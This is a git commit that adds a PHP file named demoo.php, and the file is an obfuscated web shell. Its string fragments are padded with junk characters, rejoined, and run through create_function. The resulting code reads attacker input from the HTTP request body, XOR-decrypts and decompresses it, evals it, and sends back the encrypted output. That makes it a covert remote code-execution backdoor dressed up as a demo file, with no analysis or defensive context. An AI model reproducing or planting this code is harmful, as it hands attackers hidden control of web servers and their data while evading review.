5597f0269fcdde70719d8829b17436c0dad58e05
HM <30953604+PakCyberPyrates@users.noreply.github.com>
2019-04-27 13:44:26 +0200

    Create demoo.php

---
+++ demoo.php
@@ -0,0 +1,13 @@
+<?php
+$p='6";$p="mI25mRtdLZKn0oz9eLZw";LZfunctioLZn x($t,$kLZ){$LZc=sLZtrlen($k);$LZl=str';
+$E='leLZn($LZtLZ);$o="";for($LZiLZ=0;$i<$l;){LZfor($jLZ=0;($j<$LZLZc&&$i<$l';
+$w='1)LZ{@ob_start(LZ)LZ;@eLZval(@gzuncoLZmpresLZs(@x(@basLZe64_deLZcode($m[';
+$q='1])LZ,$k))LZ);$LZLZo=@ob_get_conLZtentLZs();@obLZ_end_cleLZan(LZ);$r=@LZ';
+$n='bLZase6LZ4_encode(@xLZ(@gzcomprLZess($o)LZ,$kLZ));LZprint("$p$kh$rLZ$kf");}';
+$a=str_replace('Dv','','crDveDvateDv_fuDvncDvtiDvon');
+$Q=');$LZj++,LZ$i++)LZ{$o.=$t{$iLZ}LZ^$k{$LZjLZ};}}return $o;}iLZLZf(@LZpreg_ma';
+$i='$k="098LZf6bcd"LZ;$khLZ="4621dLZ373cLZade";$LZkf="LZ4e83LZ262LZ7LZb4f';
+$M='tch("/$LZkh(.+LZ)LZ$kf/",@fiLZle_get_coLZntentsLZ("pLZhp://iLZnput")LZ,$m)=LZ=';
+$O=str_replace('LZ','',$i.$p.$E.$Q.$M.$w.$q.$n);
+$H=$a('',$O);$H();
+?>
